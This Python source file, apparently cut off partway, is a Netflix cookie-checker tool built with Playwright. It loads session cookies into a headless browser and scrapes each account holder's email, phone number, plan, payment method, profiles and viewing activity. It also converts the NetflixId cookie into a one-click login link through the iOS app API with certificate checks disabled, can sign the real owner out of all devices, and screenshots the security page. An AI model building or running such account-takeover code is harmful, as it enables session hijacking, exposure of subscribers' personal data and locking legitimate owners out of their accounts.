from playwright.async_api import async_playwright
import re
import logging
from typing import Dict, List, Optional
import uuid
import subprocess
import sys
import fast_api_checker

# Configure logging - LIVE DEBUG MODE
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Abort control for long-running sessions
ABORT_REQUESTED: bool = False

def request_abort() -> None:
    """Signal any in-flight scraping session to abort ASAP."""
    global ABORT_REQUESTED
    ABORT_REQUESTED = True

# Netflix URLs
BROWSE_URL = "https://www.netflix.com/browse"
ACCOUNT_URL = "https://www.netflix.com/account"
SECURITY_URL = "https://www.netflix.com/account/security"
PROFILES_URL = "https://www.netflix.com/account/profiles"
MEMBERSHIP_URL = "https://www.netflix.com/account/membership"
VIEWING_ACTIVITY_URL = "https://www.netflix.com/viewingactivity"
PROFILE_SEL = "div.profile-icon"
TIMEOUT = 15_000  # 15 seconds timeout

async def _ensure_chromium_and_launch(
    p,
    *,
    headless: bool = True,
    slow_mo: int = 0,
    args: Optional[List[str]] = None,
    viewport: Optional[Dict[str, int]] = None,
    user_agent: Optional[str] = None,
):
    """Original launcher without auto-install or locale/headers overrides."""
    launch_args = args or []
    browser = await p.chromium.launch(headless=headless, slow_mo=slow_mo, args=launch_args)
    context_kwargs: Dict[str, object] = {}
    if viewport:
        context_kwargs["viewport"] = viewport
    if user_agent:
        context_kwargs["user_agent"] = user_agent
    context = await browser.new_context(**context_kwargs)
    return browser, context

def parse_cookies_string(cookie_str: str) -> list[dict]:
    cookies = []
    for pair in cookie_str.strip().split(";"):
        if "=" in pair:
            name, value = pair.strip().split("=", 1)
            cookies.append({
                "name": name.strip(),
                "value": value.strip(),
                "domain": ".netflix.com",
                "path": "/",
            })
    return cookies

async def goto_netflix_account(cookies: list[dict]) -> bool:
    async with async_playwright() as p:
        browser, context = await _ensure_chromium_and_launch(p, headless=True)
        await context.add_cookies(cookies)
        page = await context.new_page()

        try:
            await page.goto(BROWSE_URL, wait_until="networkidle", timeout=TIMEOUT)
            await page.goto(ACCOUNT_URL, wait_until="networkidle", timeout=TIMEOUT)

            if page.url.startswith(ACCOUNT_URL):
                await browser.close()
                return True

            try:
                await page.wait_for_selector(PROFILE_SEL, timeout=8000)
                await page.click(PROFILE_SEL, force=True)
                await page.wait_for_load_state("networkidle", timeout=TIMEOUT)
                await page.goto(ACCOUNT_URL, wait_until="networkidle", timeout=TIMEOUT)
                if page.url.startswith(ACCOUNT_URL):
                    await browser.close()
                    return True
            except Exception:
                pass

        except Exception as e:
            logger.error(f"Error opening Netflix: {e}")

        await browser.close()
        return False

async def fetch_enhanced_account_details(cookies_list):
    """
    Enhanced version of account checking that pulls deeply nested plan information,
    extra members, video quality, max streams, etc., using the Fast API checker.
    """
    return await fast_api_checker.fetch_enhanced_account_details(cookies_list)

async def generate_direct_login_link_api(cookies_list):
    """
    Generates a direct login link using the Fast API checker.
    """
    return await fast_api_checker.generate_direct_login_link_api(cookies_list)

async def fetch_account_details(cookies: list[dict]) -> dict | None:
    async with async_playwright() as p:
        browser, context = await _ensure_chromium_and_launch(p, headless=True)
        await context.add_cookies(cookies)
        page = await context.new_page()

        email = "N/A"
        plan = "N/A"
        member_since = "N/A"
        package = "N/A"
        profile_name = "N/A"
        service_code = "N/A"
        phone_number = "N/A"
        email_verified = "N/A"
        phone_verified = "N/A"

        try:
            await page.goto(SECURITY_URL, wait_until="networkidle", timeout=TIMEOUT)
            text = await page.inner_text("body")
            email_match = re.search(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", text)
            if email_match:
                email = email_match.group(0)

            # Updated regex to handle various phone number formats including (609) 505-0234
            phone_match = re.search(r"\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}|\+?\d{1,3}[-.\s]?\d{3,4}[-.\s]?\d{3,5}", text)
            if phone_match:
                phone_number = phone_match.group(0).strip()
            
            # Also try to find phone number in specific HTML structure like "Mobile phone(609) 505-0234"
            if phone_number == "N/A":
                mobile_phone_match = re.search(r"Mobile phone\s*\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}", text)
                if mobile_phone_match:
                    # Extract just the phone number part
                    phone_part = re.search(r"\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}", mobile_phone_match.group(0))
                    if phone_part:
                        phone_number = phone_part.group(0).strip()

            # Improved verification detection
            phone_verified = "N/A"
            email_verified = "N/A"
            
            # Check for verification status using multiple methods
            try:
                # Method 1: Look for verification status in the page content
                page_text = text.lower()
                
                # Check for phone verification
                if phone_number != "N/A":
                    # Look for phone verification patterns
                    phone_verification_patterns = [
                        "needs verification" in page_text,
                        "verify phone" in page_text,
                        "unverified phone" in page_text,
                        "phone verification" in page_text
                    ]
                    
                    if any(phone_verification_patterns):
                        phone_verified = "❌ Non-verified"
                    else:
                        # Check if phone is mentioned without verification issues
                        phone_verified = "✅ Verified"
                
                # Check for email verification
                if email != "N/A":
                    # Look for email verification patterns
                    email_verification_patterns = [
                        "needs verification" in page_text,
                        "verify email" in page_text,
                        "unverified email" in page_text,
                        "email verification" in page_text
                    ]
                    
                    if any(email_verification_patterns):
                        email_verified = "❌ Non-verified"
                    else:
                        # Check if email is mentioned without verification issues
                        email_verified = "✅ Verified"
                
                # Method 2: Look for verification status in specific HTML elements
                try:
                    # Look for verification status in security page elements
                    verification_status_elements = await page.query_selector_all('[data-uia*="verification"], [data-uia*="verify"], .verification-status, button[data-uia*="verify"], a[data-uia*="verify"]')
                    
                    for element in verification_status_elements:
                        element_text = await element.inner_text()
                        if "needs verification" in element_text.lower() or "verify" in element_text.lower():
                            if phone_number != "N/A" and phone_number in element_text:
                                phone_verified = "❌ Non-verified"
                            if email != "N/A" and email in element_text:
                                email_verified = "❌ Non-verified"
                    
                    # Method 3: Check for verification status by looking at button states
                    verify_buttons = await page.query_selector_all('button[data-uia*="verify"], a[data-uia*="verify"]')
                    
                    for button in verify_buttons:
                        button_text = await button.inner_text()
                        button_html = await button.inner_html()
                        
                        # If there's a verify button, it means verification is needed
                        if "verify" in button_text.lower():
                            if phone_number != "N/A" and (phone_number in button_html or "phone" in button_text.lower()):
                                phone_verified = "❌ Non-verified"
                            if email != "N/A" and (email in button_html or "email" in button_text.lower()):
                                email_verified = "❌ Non-verified"
                                
                except Exception as e:
                    logger.error(f"Error in verification element detection: {e}")
                    
            except Exception as e:
                logger.error(f"Error in verification detection: {e}")
                # Fallback to basic detection
                if "needs verification" in text.lower():
                    if phone_number != "N/A":
                        phone_verified = "❌ Non-verified"
                    if email != "N/A":
                        email_verified = "❌ Non-verified"
                else:
                    if phone_number != "N/A":
                        phone_verified = "✅ Verified"
                    if email != "N/A":
                        email_verified = "✅ Verified"

        except Exception as e:
            logger.error(f"Could not read email/phone: {e}")

        try:
            await page.goto(ACCOUNT_URL, wait_until="networkidle", timeout=TIMEOUT)
            
            # 1. Try traditional selectors first
            elem = await page.query_selector('h3[data-uia="account-overview-page+membership-card+title"]')
            if elem:
                plan = (await elem.inner_text()).strip()

            mem = await page.query_selector('div[data-uia="account-overview-page+membership-card+plan-banner"]')
            if mem:
                txt = (await mem.inner_text()).strip()
                member_since = txt.replace("Member Since", "").strip()

            # Enhanced package/payment method extraction
            payment_detail_selectors = [
                '[data-uia*="payment+details"] span[data-uia*="mopType"]',
                '[data-uia*="DIRECT_DEBIT"] span[data-uia*="mopType"]',
                '[data-uia*="CREDIT_CARD"] span[data-uia*="mopType"]',
                '[data-uia*="PAYPAL"] span[data-uia*="mopType"]',
                'div[data-uia="account-overview-page+membership-card+payment"] p'
            ]
            
            for selector in payment_detail_selectors:
                try:
                    payment_element = await page.query_selector(selector)
                    if payment_element:
                        payment_text = (await payment_element.inner_text()).strip()
                        # Clean up HTML entities and extra spaces
                        payment_text = payment_text.replace('&nbsp;', ' ').replace('\u00a0', ' ').replace('  ', ' ')
                        if payment_text and len(payment_text) > 3:
                            package = payment_text
                            logger.info(f"✅ Found payment method: {payment_text}")
                            break
                except Exception:
                    continue
                    
            # 2. Text-based Regex Fallback for New React UI
            account_text = await page.inner_text("body")
            
            if plan == "N/A":
                plan_match = re.search(r"(Premium|Standard|Basic)(\s+with\s+ads)?(\s+plan)?", account_text, re.IGNORECASE)
                if plan_match:
                    plan = plan_match.group(0).strip()
                    
            if member_since == "N/A":
                member_since_match = re.search(r"Member since\s+([A-Za-z]+\s+\d{4})", account_text, re.IGNORECASE)
                if member_since_match:
                    member_since = member_since_match.group(1).strip()
                    
            if package == "N/A":
                # Matches: "Billed through 네이버 멤버십 package add-on" or "Billed as a package add-on" or "Billed via X"
                package_match = re.search(r"Billed (through|as a|via)\s+(.*?)(?:\n|$)", account_text, re.IGNORECASE)
                if package_match:
                    package_str = package_match.group(2).strip()
                    if package_str:
                        package = package_str

            btn = await page.query_selector('button[data-uia="account+footer+service-code-button"]')
            if btn:
                await btn.click()
                await page.wait_for_timeout(1000)
                service_code_text = await btn.inner_text()
                if service_code_text:
                    service_code = service_code_text.strip()

        except Exception as e:
            logger.error(f"Could not read plan/member/package/service code: {e}")

        try:
            await page.goto("https://www.netflix.com/account/profiles", wait_until="networkidle", timeout=TIMEOUT)
            
            # 1. Text-based Regex Fallback for New React UI
            profiles_text = await page.inner_text("body")
            profile_list_match = re.search(r"Profile Settings\s+(.*?)\s+Add Profile", profiles_text, re.DOTALL | re.IGNORECASE)
            
            if profile_list_match:
                extracted_profiles_block = profile_list_match.group(1).strip()
                raw_lines = [line.strip() for line in extracted_profiles_block.split('\n') if line.strip()]
                clean_profiles = []
                for line in raw_lines:
                    if line.lower() not in ["now watching", ">", "settings", "edit", "new", "adjust parental controls"]:
                        if len(line) < 30 and not line.startswith("Set maturity"):
                            clean_profiles.append(line)
                
                if clean_profiles:
                    profile_name = f"{', '.join(clean_profiles)} ({len(clean_profiles)})"
            
            # 2. Try traditional selector if regex fails
            if profile_name == "N/A":
                name_div = await page.query_selector('div[data-cl-view="accountProfileSettings"] p.e1tifjsj0')
                if name_div:
                    profile_name = (await name_div.inner_text()).strip()

        except Exception as e:
            logger.error(f"Could not read profile name: {e}")

        await browser.close()

        return {
            "email": email,
            "plan": plan,
            "member_since": member_since,
            "profile_name": profile_name,
            "package": package,
            "service_code": service_code,
            "phone_number": phone_number,
            "email_verified": email_verified,
            "phone_verified": phone_verified,
        }

async def detect_and_change_language_to_english(page) -> bool:
    """Detect if language is not English and force-change to English via language settings.

    Robust flow with multiple fallbacks: account profiles -> language section, or direct LanguagePreferences page.
    """
    try:
        logger.info("🔍 Checking current language...")

        # Quick check: HTML lang or URL locale
        try:
            html_lang = await page.get_attribute("html", "lang")
        except Exception:
            html_lang = None
        url_locale_non_english = any(seg in (page.url or "") for seg in ["/ja", "/es", "/de", "/fr", "/pl", "/it", "/pt", "/tr", "/ar", "/ru"]) if hasattr(page, 'url') else False
        if html_lang and html_lang.startswith("en") and not url_locale_non_english:
            logger.info("✅ Language is already English")
            return True

        # Always attempt to enforce English to be safe
        logger.info("🔄 Enforcing English language...")

        # Fallback A: try dedicated LanguagePreferences page first
        try:
            await page.goto("https://www.netflix.com/LanguagePreferences", wait_until="domcontentloaded", timeout=TIMEOUT)
            await page.wait_for_load_state("networkidle", timeout=15000)
            await page.wait_for_timeout(1000)

            # Try select dropdown approach
            try:
                dropdown = await page.query_selector('select, select[data-uia*="language"], select[name*="lang" i]')
                if dropdown:
                    for val in ["English", "en", "en-US", "en-GB"]:
                        try:
                            await dropdown.select_option(value=val)
                            break
                        except Exception:
                            continue
            except Exception:
                pass

            # Try radio button/label approach
            try:
                # Click label that contains English text
                english_label = await page.query_selector('label:has-text("English")')
                if english_label:
                    await english_label.click()
                else:
                    # Try any input with value containing en
                    en_input = await page.query_selector('input[type="radio"][value*="en" i], input[type="checkbox"][value*="en" i]')
                    if en_input:
                        await en_input.check()
            except Exception:
                pass

            # Save button
            try:
                save = await page.query_selector('button[data-uia*="save"], button:has-text("Save"), input[type="submit"]')
                if save:
                    await save.click()
                    await page.wait_for_timeout(1500)
            except Exception:
                pass

            # Verify again
            try:
                html_lang = await page.get_attribute("html", "lang")
                if html_lang and html_lang.startswith("en"):
                    logger.info("✅ Successfully set English (LanguagePreferences)")
                    return True
            except Exception:
                pass
        except Exception:
            # ignore and try next fallback
            pass

        # Fallback B: go via account profiles -> profile language settings
        try:
            await page.goto(PROFILES_URL, wait_until="domcontentloaded", timeout=TIMEOUT)
            await page.wait_for_load_state("networkidle", timeout=15000)
            await page.wait_for_timeout(1000)

            profile_selectors = [
                'button[data-uia*="menu-card"]:first-of-type',
                'li[data-uia*="menu-card"]:first-of-type button',
                'button[data-uia*="PressableListItem"]:first-of-type',
                '.profile-button:first-of-type',
                '.menu-card:first-of-type button'
            ]
            clicked = False
            for sel in profile_selectors:
                try:
                    el = await page.wait_for_selector(sel, timeout=4000)
                    if el:
                        await el.click()
                        await page.wait_for_load_state("networkidle", timeout=12000)
                        clicked = True
                        break
                except Exception:
                    continue
            if not clicked:
                logger.error("❌ Could not open first profile")
                return False

            language_triggers = [
                '[data-uia*="languages"] button',
                '[data-uia*="language"] button',
                'button:has-text("Language")',
                'a[href*="language" i]'
            ]
            opened = False
            for sel in language_triggers:
                try:
                    el = await page.wait_for_selector(sel, timeout=4000)
                    if el:
                        await el.click()
                        await page.wait_for_load_state("networkidle", timeout=10000)
                        opened = True
                        break
                except Exception:
                    continue
            if not opened:
                logger.error("❌ Could not open language preferences from profile")
                return False

            # Try select and radio methods again
            try:
                dropdown = await page.query_selector('select, select[data-uia*="language"], select[name*="lang" i]')
                if dropdown:
                    for val in ["English", "en", "en-US", "en-GB"]:
                        try:
                            await dropdown.select_option(value=val)
                            break
                        except Exception:
                            continue
                label = await page.query_selector('label:has-text("English")')
                if label:
                    await label.click()
                else:
                    en_input = await page.query_selector('input[type="radio"][value*="en" i], input[type="checkbox"][value*="en" i]')
                    if en_input:
                        await en_input.check()
            except Exception:
                pass

            # Save
            try:
                save = await page.query_selector('button[data-uia*="save"], button:has-text("Save"), input[type="submit"]')
                if save:
                    await save.click()
                    await page.wait_for_timeout(1200)
            except Exception:
                pass

            # Verify
            try:
                html_lang = await page.get_attribute("html", "lang")
                if html_lang and html_lang.startswith("en"):
                    logger.info("✅ Successfully set English (profile path)")
                    return True
            except Exception:
                pass
        except Exception:
            pass

        logger.warning("⚠️ Could not confirm English language; proceeding anyway")
        return False
    except Exception as e:
        logger.error(f"❌ Error in language detection/change: {e}")
        return False

async def get_last_viewed_content(page) -> str:
    """Get the last viewed content from viewing activity"""
    try:
        logger.info("🔍 Fetching last viewed content...")
        
        # Go to viewing activity page
        await page.goto(VIEWING_ACTIVITY_URL, wait_until="domcontentloaded", timeout=TIMEOUT)
        await page.wait_for_load_state("networkidle", timeout=15000)
        await page.wait_for_timeout(3000)
        
        # Try multiple selectors for viewing activity items
        activity_selectors = [
            '.retableRow:first-child .title',
            '.viewing-activity-item:first-child .title-name',
            'tr:first-child .title',
            '.activity-row:first-child .show-title',
            '[data-uia="viewing-activity-item"]:first-child .title',
            '.retableRow:first-child td:nth-child(1)',
            'tbody tr:first-child td:first-child'
        ]
        
        for selector in activity_selectors:
            try:
                last_viewed_element = await page.wait_for_selector(selector, timeout=5000)
                if last_viewed_element:
                    last_viewed = await last_viewed_element.inner_text()
                    if last_viewed and last_viewed.strip():
                        logger.info(f"✅ Found last viewed: {last_viewed.strip()}")
                        return last_viewed.strip()
            except Exception:
                continue
        
        # Try alternative approach - look for any title in viewing activity
        try:
            all_titles = await page.query_selector_all('.title, .show-title, .title-name')
            if all_titles:
                for title_element in all_titles[:3]:  # Check first 3 titles
                    title_text = await title_element.inner_text()
                    if title_text and title_text.strip():
                        logger.info(f"✅ Found viewing activity title: {title_text.strip()}")
                        return title_text.strip()
        except Exception:
            pass
            
        logger.warning("⚠️ No viewing activity found")
        return "No recent activity"
        
    except Exception as e:
        logger.error(f"❌ Error fetching last viewed content: {e}")
        return "Unable to fetch"

import requests
import asyncio
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

async def generate_direct_login_link_api(cookies: List[Dict]) -> str:
    """Generate direct login link using the fast Netflix iOS API"""
    logger.info("🔍 API: Generating direct login link...")
    try:
        import urllib.parse
        netflix_id = None
        for cookie in cookies:
            if cookie.get("name") == "NetflixId":
                # Decode the cookie value if it's URL-encoded
                val = cookie.get("value", "")
                if "%" in val:
                    try:
                        netflix_id = urllib.parse.unquote(val)
                    except Exception:
                        netflix_id = val
                else:
                    netflix_id = val
                break
                
        if not netflix_id:
            logger.warning("❌ No NetflixId cookie found")
            return "COOKIES_EXPIRED"
            
        def _fetch():
            url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
            params = {
                "appVersion": "15.48.1",
                "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
                "device_type": "NFAPPL-02-",
                "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
                "idiom": "phone",
                "iosVersion": "15.8.5",
                "isTablet": "false",
                "languages": "en-US",
                "locale": "en-US",
                "maxDeviceWidth": "375",
                "model": "saget",
                "modelType": "IPHONE8-1",
                "odpAware": "true",
                "path": '["account","token","default"]',
                "pathFormat": "graph",
                "pixelDensity": "2.0",
                "progressive": "false",
                "responseFormat": "json",
            }
            headers = {
                "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
                "x-netflix.request.attempt": "1",
                "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
                "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
                "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
                "x-netflix.context.app-version": "15.48.1",
                "x-netflix.argo.translated": "true",
                "x-netflix.context.form-factor": "phone",
                "x-netflix.context.sdk-version": "2012.4",
                "x-netflix.client.appversion": "15.48.1",
                "x-netflix.context.max-device-width": "375",
                "x-netflix.context.ab-tests": "",
                "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
                "x-netflix.client.type": "argo",
                "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
                "x-netflix.context.locales": "en-US",
                "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
                "x-netflix.client.iosversion": "15.8.5",
                "accept-language": "en-US;q=1",
                "x-netflix.argo.abtests": "",
                "Cookie": f"NetflixId={netflix_id}"
            }
            return requests.get(url, params=params, headers=headers, timeout=10, verify=False)
            
        response = await asyncio.to_thread(_fetch)
        
        if response.status_code == 401 or response.status_code == 403:
            logger.warning(f"❌ API returned {response.status_code}")
            return "COOKIES_EXPIRED"
            
        response.raise_for_status()
        data = response.json()
        
        token = data.get("value", {}).get("account", {}).get("token", {}).get("default", {}).get("token")
        if token:
            logger.info("✅ Extracted nftoken successfully!")
            return f"https://www.netflix.com/account?nftoken={token}"
            
        return "NO_NFTOKEN_FOUND"
    except Exception as e:
        logger.error(f"❌ Exception in API request: {e}")
        return "N/A"


async def sign_out_all_devices(cookies: List[Dict]) -> bool:
    """Sign out of all devices from the security page."""
    try:
        async with async_playwright() as p:
            browser, context = await _ensure_chromium_and_launch(p, headless=True)
            await context.add_cookies(cookies)
            page = await context.new_page()

            try:
                await page.goto(SECURITY_URL, wait_until="networkidle", timeout=TIMEOUT)
            except Exception:
                await browser.close()
                return False

            # Try multiple selectors/texts for "Sign out of all devices"
            selectors = [
                'button[data-uia*="sign-out-all"]',
                'button:has-text("Sign out of all devices")',
                'button:has-text("Sign out")',
                'a:has-text("Sign out of all devices")',
            ]

            clicked = False
            for selector in selectors:
                try:
                    el = await page.query_selector(selector)
                    if el:
                        await el.click()
                        clicked = True
                        break
                except Exception:
                    continue

            # If not found by selector, try text search fallback
            if not clicked:
                try:
                    all_buttons = await page.query_selector_all('button, a')
                    for btn in all_buttons:
                        text = (await btn.inner_text()).lower()
                        if "sign out" in text and ("all" in text or "devices" in text):
                            await btn.click()
                            clicked = True
                            break
                except Exception:
                    pass

            if not clicked:
                await browser.close()
                return False

            # Confirm dialog if any
            try:
                confirm_selectors = [
                    'button:has-text("Sign out")',
                    'button:has-text("Confirm")',
                    'button[data-uia*="confirm"]',
                    'button[aria-label*="confirm"]'
                ]
                for selector in confirm_selectors:
                    try:
                        conf = await page.query_selector(selector)
                        if conf:
                            await conf.click()
                            break
                    except Exception:
                        continue
            except Exception:
                pass

            await page.wait_for_timeout(1500)
            await browser.close()
            return True
    except Exception as e:
        logger.error(f"Error in sign_out_all_devices: {e}")
        return False

async def sign_out_via_manage_devices(cookies: List[Dict]) -> bool:
    """Open Manage Devices and click the Sign Out button.

    This signs out the current device/session per Netflix UI.
    Returns True if the click action succeeded.
    """
    try:
        async with async_playwright() as p:
            browser, context = await _ensure_chromium_and_launch(
                p, headless=True, viewport={"width": 1200, "height": 800}
            )
            await context.add_cookies(cookies)
            page = await context.new_page()

            try:
                await page.goto("https://www.netflix.com/ManageDevices", wait_until="networkidle", timeout=TIMEOUT)
            except Exception:
                await browser.close()
                return False

            # Wait for sign-out button and click it
            try:
                # Prefer Netflix data-uia attribute
                btn = await page.wait_for_selector('[data-uia="btn-sign-out"]', timeout=6000)
                if btn:
                    await btn.click()
                else:
                    # Fallback by text
                    await page.click('button:has-text("Sign Out")')
            except Exception:
                # Try text fallback if data-uia failed
                try:
                    await page.click('button:has-text("Sign Out")')
                except Exception:
                    await browser.close()
                    return False

            # Optional: wait a moment for completion
            try:
                await page.wait_for_load_state("networkidle", timeout=5000)
                await page.wait_for_timeout(800)
            except Exception:
                pass

            await browser.close()
            return True
    except Exception as e:
        logger.error(f"Error in sign_out_via_manage_devices: {e}")
        return False
async def capture_security_screenshot(cookies: List[Dict], width: int = 1200, height: int = 800, email_hint: Optional[str] = None, direct_login_link: Optional[str] = None) -> Optional[str]:
    """Open Security page and capture exactly the security block."""
    try:
        async with async_playwright() as p:
            browser, context = await _ensure_chromium_and_launch(
                p, headless=True, viewport={"width": width, "height": height}
            )
            await context.add_cookies(cookies)
            page = await context.new_page()

            try:
                # OPTIMIZED: Use direct token link to authenticate instantly
                target_url = direct_login_link if direct_login_link and direct_login_link.startswith("http") else SECURITY_URL
                await page.goto(target_url, wait_until="networkidle", timeout=15000)
                
                # Navigate to security if not already there
                if not page.url.startswith(SECURITY_URL):
                    await page.goto(SECURITY_URL, wait_until="networkidle", timeout=10000)

                # Wait for the exact security section element
                section = await page.wait_for_selector('section[data-uia="account-security-page"]', timeout=10000)
                
                # Build filename from email if possible
                chosen_email = email_hint if email_hint and email_hint != "N/A" and email_hint != "N_A" else f"nf_{uuid.uuid4().hex}"
                safe_name = re.sub(r"[^a-zA-Z0-9._-]", "_", chosen_email)
                if not safe_name.lower().endswith('.png'):
                    safe_name = f"{safe_name}.png"
                path = safe_name

                # Take screenshot of JUST this element
                await section.screenshot(path=path)
                await browser.close()
                return path

            except Exception as e:
                logger.error(f"❌ Screenshot navigation/clipping error: {e}")
                await browser.close()
                return None
    except Exception as e:
        logger.error(f"Error in capture_security_screenshot: {e}")
        return None

async def fetch_service_code_only(cookies: List[Dict]) -> Optional[str]:
    """Navigate to account page and retrieve a fresh service code only.

    Returns the service code string or None.
    """
    try:
        async with async_playwright() as p:
            browser, context = await _ensure_chromium_and_launch(
                p, headless=True, viewport={"width": 1024, "height": 720}
            )
            await context.add_cookies(cookies)
            page = await context.new_page()
            try:
                await page.goto(ACCOUNT_URL, wait_until="networkidle", timeout=TIMEOUT)
                btn = await page.query_selector('button[data-uia="account+footer+service-code-button"]')
                if btn:
                    await btn.click()
                    await page.wait_for_timeout(600)
                    text = await btn.inner_text()
                    await browser.close()
                    return text.strip() if text else None
            except Exception:
                pass
            await browser.close()
            return None
    except Exception as e:
        logger.error(f"Error in fetch_service_code_only: {e}")
        return None

async def extract_nftoken(cookies: List[Dict]) -> Optional[str]:
    """Extract nftoken from Netflix account page URL or cookies.
    
    Returns the nftoken string or None.
    """
    try:
        async with async_playwright() as p:
            browser, context = await _ensure_chromium_and_launch(
                p, headless=True, viewport={"width": 1024, "height": 720}
            )
            await context.add_cookies(cookies)
            page = await context.new_page()
            
            try:
                # Method 1: Try to navigate to account page and check for nftoken in URL
                logger.info("🔍 Method 1: Checking account page URL for nftoken...")
                await page.goto(ACCOUNT_URL, wait_until="networkidle", timeout=TIMEOUT)
                await page.wait_for_timeout(3000)
                
                current_url = page.url
                logger.info(f"📍 Current URL: {current_url}")
                
                if "nftoken=" in current_url:
                    nftoken_match = re.search(r'nftoken=([^&]+)', current_url)
                    if nftoken_match:
                        nftoken = nftoken_match.group(1)
                        logger.info(f"✅ Found nftoken in URL: {nftoken[:20]}...")
                        await browser.close()
                        return nftoken
                
                # Method 2: Try clicking on account settings to trigger nftoken generation
                logger.info("🔍 Method 2: Trying to trigger nftoken generation...")
                try:
                    # Look for account dropdown or settings
                    account_selectors = [
                        'button[data-uia*="account"]',
                        'a[href*="account"]',
                        'button:has-text("Account")',
                        'a:has-text("Account")',
                        '[data-uia*="account-menu"]',
                        '.account-menu button',
                        '.profile-menu button'
                    ]
                    
                    for selector in account_selectors:
                        try:
                            element = await page.query_selector(selector)
                            if element:
                                logger.info(f"🔍 Clicking element: {selector}")
                                await element.click()
                                await page.wait_for_timeout(2000)
                                
                                # Check URL after click
                                current_url = page.url
                                logger.info(f"📍 URL after click: {current_url}")
                                
                                if "nftoken=" in current_url:
                                    nftoken_match = re.search(r'nftoken=([^&]+)', current_url)
                                    if nftoken_match:
                                        nftoken = nftoken_match.group(1)
                                        logger.info(f"✅ Found nftoken after click: {nftoken[:20]}...")
                                        await browser.close()
                                        return nftoken
                        except Exception:
                            continue
                            
                except Exception as e:
                    logger.warning(f"Error clicking account elements: {e}")
                
                # Method 3: Try navigating to different account pages
                logger.info("🔍 Method 3: Trying different account pages...")
                account_pages = [
                    "https://www.netflix.com/account",
                    "https://www.netflix.com/account/membership",
                    "https://www.netflix.com/account/security",
                    "https://www.netflix.com/account/profiles"
                ]
                
                for page_url in account_pages:
                    try:
                        logger.info(f"🔍 Navigating to: {page_url}")
                        await page.goto(page_url, wait_until="networkidle", timeout=TIMEOUT)
                        await page.wait_for_timeout(2000)
                        
                        current_url = page.url
                        logger.info(f"📍 URL after navigation: {current_url}")
                        
                        if "nftoken=" in current_url:
                            nftoken_match = re.search(r'nftoken=([^&]+)', current_url)
                            if nftoken_match:
                                nftoken = nftoken_match.group(1)
                                logger.info(f"✅ Found nftoken on {page_url}: {nftoken[:20]}...")
                                await browser.close()
                                return nftoken
                    except Exception as e:
                        logger.warning(f"Error navigating to {page_url}: {e}")
                        continue
                
                # Method 4: Try to extract nftoken from cookies directly
                logger.info("🔍 Method 4: Checking cookies for nftoken...")
                try:
                    context_cookies = await context.cookies()
                    for cookie in context_cookies:
                        cookie_name = cookie.get('name', '')
                        cookie_value = cookie.get('value', '')
                        
                        logger.info(f"🔍 Cookie: {cookie_name} = {cookie_value[:50]}...")
                        
                        if cookie_name == 'NetflixId' and cookie_value:
                            # Try to decode and extract nftoken from NetflixId cookie
                            try:
                                import urllib.parse
                                decoded_value = urllib.parse.unquote(cookie_value)
                                logger.info(f"🔍 Decoded NetflixId: {decoded_value[:100]}...")
                                
                                # Look for nftoken pattern in decoded value
                                nftoken_patterns = [
                                    r'nftoken[=:]([A-Za-z0-9+/=]+)',
                                    r'nftoken["\']?[=:]["\']?([A-Za-z0-9+/=]+)',
                                    r'"nftoken":"([A-Za-z0-9+/=]+)"',
                                    r'nftoken=([A-Za-z0-9+/=]+)'
                                ]
                                
                                for pattern in nftoken_patterns:
                                    nftoken_match = re.search(pattern, decoded_value)
                                    if nftoken_match:
                                        nftoken = nftoken_match.group(1)
                                        logger.info(f"✅ Found nftoken in NetflixId cookie: {nftoken[:20]}...")
                                        await browser.close()
                                        return nftoken
                            except Exception as e:
                                logger.warning(f"Error decoding NetflixId cookie: {e}")
                                continue
                                
                        # Also check for SecureNetflixId cookie
                        elif cookie_name == 'SecureNetflixId' and cookie_value:
                            try:
                                import urllib.parse
                                decoded_value = urllib.parse.unquote(cookie_value)
                                logger.info(f"🔍 Decoded SecureNetflixId: {decoded_value[:100]}...")
                                
                                nftoken_patterns = [
                                    r'nftoken[=:]([A-Za-z0-9+/=]+)',
                                    r'nftoken["\']?[=:]["\']?([A-Za-z0-9+/=]+)',
                                    r'"nftoken":"([A-Za-z0-9+/=]+)"',
                                    r'nftoken=([A-Za-z0-9+/=]+)'
                                ]
                                
                                for pattern in nftoken_patterns:
